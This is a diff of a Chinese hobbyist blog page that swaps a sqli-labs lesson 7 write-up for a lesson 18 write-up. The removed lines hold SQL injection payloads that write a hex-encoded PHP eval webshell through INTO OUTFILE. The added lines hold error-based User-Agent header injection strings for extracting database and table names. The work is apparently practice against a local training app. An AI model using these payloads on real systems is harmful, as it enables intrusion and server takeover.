@@ -79,19 +79,21 @@
 
 
 
-<meta name="description" content="看了一下源码,sql查询语句为: SELECT * FROM users WHERE id=((&amp;apos;$id&amp;apos;)) LIMIT 0,1">
+<meta name="description" content="题目:POST-Header Injection-Uagent field-Error based">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs-master les7:GET-dump into outfile-string">
-<meta property="og:url" content="https://ocgittt.github.io/2019/07/20/sqli-labs-master-les7/index.html">
+<meta property="og:title" content="sqli-labs-les18">
+<meta property="og:url" content="https://ocgittt.github.io/2019/07/31/sqli-labs-les18/index.html">
 <meta property="og:site_name" content="OC的博客">
-<meta property="og:description" content="看了一下源码,sql查询语句为: SELECT * FROM users WHERE id=((&amp;apos;$id&amp;apos;)) LIMIT 0,1">
+<meta property="og:description" content="题目:POST-Header Injection-Uagent field-Error based">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/image.png">
-<meta property="og:updated_time" content="2019-07-29T05:22:42.955Z">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/31/sqli-labs-les18/start.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/31/sqli-labs-les18/failed1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2019/07/31/sqli-labs-les18/Dumb.png">
+<meta property="og:updated_time" content="2019-07-31T14:32:44.644Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs-master les7:GET-dump into outfile-string">
-<meta name="twitter:description" content="看了一下源码,sql查询语句为: SELECT * FROM users WHERE id=((&amp;apos;$id&amp;apos;)) LIMIT 0,1">
-<meta name="twitter:image" content="https://ocbillhome.files.wordpress.com/2019/07/image.png">
+<meta name="twitter:title" content="sqli-labs-les18">
+<meta name="twitter:description" content="题目:POST-Header Injection-Uagent field-Error based">
+<meta name="twitter:image" content="https://ocgittt.github.io/2019/07/31/sqli-labs-les18/start.png">
 
 
 
@@ -121,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="https://ocgittt.github.io/2019/07/20/sqli-labs-master-les7/">
+  <link rel="canonical" href="https://ocgittt.github.io/2019/07/31/sqli-labs-les18/">
 
 
 
 
 
-  <title>sqli-labs-master les7:GET-dump into outfile-string | OC的博客</title>
+  <title>sqli-labs-les18 | OC的博客</title>
   
 
 
@@ -286,7 +288,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/20/sqli-labs-master-les7/">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/31/sqli-labs-les18/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="OC">
@@ -303,7 +305,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs-master les7:GET-dump into outfile-string</h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs-les18</h1>
         
 
         <div class="post-meta">
@@ -315,8 +317,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-20T23:52:22+08:00">
-                2019-07-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-31T18:42:13+08:00">
+                2019-07-31
               </time>
             
 
@@ -375,17 +377,39 @@
       
 
       
-        <p>看了一下源码,sql查询语句为:</p>
-<pre><code>SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1</code></pre><a id="more"></a>
-<p>看了一下题目,outfile,<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">搜索了一下outfile是怎么回事</a>,然后构造了这样的一个payload</p>
-<pre><code>1&apos;)) select * from users into outfile &apos;D:/software/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.txt&apos; %23</code></pre><p>然后…什么事情都没有发生</p>
-<p>–2019.7.20 23:52</p>
-<p>继续，传个一句话木马上去</p>
-<pre><code>id=1&apos;))union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B276D756D61275D293B203F3E into outfile &apos;D:/software/phpStudy/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.php&apos; %23</code></pre><p>不行，看到my.ini里面#secure_file_priv = D:/backup，去掉注释，重启phpstudy进入MySQL命令行</p>
-<p>show variables like ‘secure_file_priv’;</p>
-<p><img src="https://ocbillhome.files.wordpress.com/2019/07/image.png" alt></p>
-<pre><code>然后http://localhost/sqli-labs-master/Less-7/?id=1%27)) union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B203F3E into outfile &quot;D:\\backup\\2.php&quot;) %23</code></pre><p>然后！还是不行。。。暂时跳过，<a href="https://blog.csdn.net/qq_44105778/article/details/86926128" target="_blank" rel="noopener">贴一下我看的WP</a></p>
-<p>–2019.7.21 11:13</p>
+        <h1 id="题目-POST-Header-Injection-Uagent-field-Error-based"><a href="#题目-POST-Header-Injection-Uagent-field-Error-based" class="headerlink" title="题目:POST-Header Injection-Uagent field-Error based"></a>题目:POST-Header Injection-Uagent field-Error based</h1><a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这又是一种船新的题目</p>
+<p>一进场,如下:</p>
+<img src="/2019/07/31/sqli-labs-les18/start.png">
+
+<hr>
+<h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><h2 id="User-Agent头字段"><a href="#User-Agent头字段" class="headerlink" title="User-Agent头字段"></a>User-Agent头字段</h2><p>用户代理（user agent）是记录软件程序的客户端信息的HTTP请求头字段，用于将创建请求的浏览器和用户代理名称等信息传送给服务器。</p>
+<p><a href="https://blog.csdn.net/Eagle_pompom/article/details/89526180" target="_blank" rel="noopener">more info</a></p>
+<h1 id="看语句"><a href="#看语句" class="headerlink" title="看语句"></a>看语句</h1><p>这次两个都是admin都是failed</p>
+<img src="/2019/07/31/sqli-labs-les18/failed1.png">
+
+<p>试一下之前记得的Dumb</p>
+<img src="/2019/07/31/sqli-labs-les18/Dumb.png" title="显示User-Agent信息">
+
+<p>放弃了这次猜不到了</p>
+<p>看源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line"></span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>但是还有一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br></pre></td></tr></table></figure>
+
+<h1 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h1><p>用brupsuite抓包,在useragent后面加上:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,database(),0x7e))and '1'='1</span><br></pre></td></tr></table></figure>
+
+<p>{&amp; asset_img db.png dbname&amp;}</p>
+<h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Truncated incorrect DOUBLE value: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0’</p>
+</blockquote>
+<hr>
+<p>库名能出来其他出不来</p>
+<p>这就很难受</p>
 
       
     </div>
@@ -410,8 +434,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/17/ctfthe-gamesqli-labs-master/" rel="next" title="sqli-labs-master les1-les6">
-                <i class="fa fa-chevron-left"></i> sqli-labs-master les1-les6
+              <a href="/2019/07/31/bugku成绩单/" rel="next" title="bugku成绩单">
+                <i class="fa fa-chevron-left"></i> bugku成绩单
               </a>
             
           </div>
@@ -419,10 +443,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/21/sqli-labs-master-les8blind-boolian-single-quotes-string/" rel="prev" title="sqli-labs-master les8:blind-boolian-single-quotes-string">
-                sqli-labs-master les8:blind-boolian-single-quotes-string <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -474,8 +494,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -577,6 +606,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目-POST-Header-Injection-Uagent-field-Error-based"><span class="nav-number">1.</span> <span class="nav-text">题目:POST-Header Injection-Uagent field-Error based</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#搜索"><span class="nav-number">3.</span> <span class="nav-text">搜索</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Agent头字段"><span class="nav-number">3.1.</span> <span class="nav-text">User-Agent头字段</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#看语句"><span class="nav-number">4.</span> <span class="nav-text">看语句</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#库名"><span class="nav-number">5.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#表名"><span class="nav-number">6.</span> <span class="nav-text">表名</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
